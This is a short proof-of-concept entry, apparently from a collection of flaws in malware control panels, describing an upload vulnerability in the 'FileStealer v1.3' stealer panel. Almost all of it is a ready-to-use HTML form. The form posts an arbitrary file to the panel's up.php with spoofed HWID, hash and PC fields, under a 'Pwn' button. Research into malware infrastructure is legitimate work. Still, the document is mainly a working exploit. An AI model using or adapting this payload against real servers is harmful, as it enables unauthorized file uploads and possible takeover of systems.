#### FileStealer v1.3


Type: Upload vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)


```

<!-- FileStealer v1.3 panel upload vulnerability -->
<!-- Panel hash: be19e93878130b2f57d42d4dcf5ffcf0 -->
<form method="POST" action="http://localhost/panel/up.php" enctype="multipart/form-data">
        File: <input type="file" name="file" />                                         <br />
        HWID: <input type="text" name="hwid" value="COOFEEBABE" />                      <br />
        Hash: <input type="text" name="hash" value="2c471313f06370d0866db1facb34668e" /><br />
        PC:   <input type="text" name="pc"   value="ANDROMAQUE" />                      <br />
        <input type="hidden" name="step" value="1337" />
        <input type="submit" value="Pwn" />
</form>
```
